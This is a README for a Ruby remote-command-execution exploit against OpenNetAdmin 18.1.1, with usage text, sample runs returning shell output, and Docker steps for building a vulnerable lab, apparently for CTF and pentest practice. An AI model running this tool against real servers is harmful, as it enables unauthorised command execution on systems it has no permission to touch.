# OpenNetAdmin RCE exploit

> OpenNetAdmin 8.5.14 <= 18.1.1 - Remote Command Execution

[[PacketStorm](https://packetstormsecurity.com/files/162516/OpenNetAdmin-18.1.1-Remote-Command-Execution.html)] - [[WLB-2021050034](https://cxsecurity.com/issue/WLB-2021050034)]

## Usage

```
$ ruby exploit.rb -h
OpenNetAdmin 8.5.14 <= 18.1.1 - Remote Command Execution

Usage:
  exploit.rb exploit <url> <cmd> [--debug]
  exploit.rb version <url> [--debug]
  exploit.rb -h | --help

exploit:      Exploit the RCE vuln
version:      Try to fetch OpenNetAdmin version

Options:
  <url>       Root URL (base path) including HTTP scheme, port and root folder
  <cmd>       Command to execute on the target
  --debug     Display arguments
  -h, --help  Show this screen

Examples:
  exploit.rb exploit http://example.org id
  exploit.rb exploit https://example.org:5000/ona 'touch hackproof'
  exploit.rb version https://example.org:5000/ona
```

Exploit example:

```
$ ruby exploit.rb exploit http://localhost:8667/ona/ id
[+] Command output:

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Version fetching example:

```
$ ruby exploit.rb version http://localhost:8667/ona/
18.1.1
```

## Requirements

- [httpx](https://gitlab.com/honeyryderchuck/httpx)
- [docopt.rb](https://github.com/docopt/docopt.rb)

Example using gem:

```
$ gem install httpx docopt
```

## Docker deployment of the vulnerable software

The docker container requires that `/etc/localtime` and `/etc/localtime` are set on your host, so that PHP can use them to get the right timezone info.

Warning: of course this setup is not suited for production usage!

## With docker-compose (recommended)

Start the containers and launch the config script.
```
$ sudo docker-compose up -d
$ sudo docker exec -ti ona-app ./init_conf.sh
$ sudo docker restart ona-app
```

Then follow [ONA Web Installation guide](https://github.com/opennetadmin/ona/wiki/Install#web-install-method) to complete your setup:
http://localhost:8667/ona/.

- use `sudo docker inspect ona-db | grep IPAddress` to get the bridged IP address of the mariadb container
- re-use the root mysql pass: `58z5J94GBcM8Hx`
- set any random app db user pass: `dDqE4bka4ntUqF`

Now the app default creds will be: `admin` / `admin`. But we won't need them.

## With docker alone

Download, install and start ONA:

```
$ sudo docker pull raabf/ona:v18.1.1
$ sudo docker run -d --publish 127.0.0.1:8667:80 -v /etc/timezone:/etc/timezone:ro -v /etc/localtime:/etc/localtime:ro --name ona-app raabf/ona:v18.1.1
$ sudo docker exec -ti ona-app ./init_conf.sh
$ sudo docker restart ona-app
```

Then install a database (MariaDB MySQL):

```
$ sudo docker pull mariadb:10.5
$ sudo docker run -p 127.0.0.1:3306:3306 --name ona-db -e MYSQL_ROOT_PASSWORD=58z5J94GBcM8Hx -d mariadb:10.5
```

Finally follow the same setup step as for docker-compose method.

## References

This is a better re-write of the original exploit [[EDB-47691]][1] [[PacketStorm]][2].

Some great analysis of the orginal exploit and vulnerability:

- [zacheller.dev](https://zacheller.dev/open-net-admin)
- [medium.com - r3d-buck3t](https://medium.com/r3d-buck3t/remote-code-execution-in-opennetadmin-5d5a53b1e67)

Challenges using the vulnerable software:

- [VulnHub - five86: 1](https://www.vulnhub.com/entry/five86-1,417/)
- [HackTheBox - OpenAdmin](https://www.hackthebox.eu/home/machines/profile/222), [OpenAdmin Write-Up](https://blog.raw.pm/en/HackTheBox-OpenAdmin-write-up/)

OpenNetAdmin: [source][3] - [vulnerable version tarball][4].

Metasploit: [EDB-47772][5] - [updated version][6]

[1]:https://www.exploit-db.com/exploits/47691
[2]:https://packetstormsecurity.com/files/155406/OpenNetAdmin-18.1.1-Remote-Code-Execution.html
[3]:https://github.com/opennetadmin/ona
[4]:https://github.com/opennetadmin/ona/archive/refs/tags/v18.1.1.tar.gz
[5]:https://www.exploit-db.com/exploits/47772
[6]:https://github.com/rapid7/metasploit-framework/blob/master//modules/exploits/unix/webapp/opennetadmin_ping_cmd_injection.rb
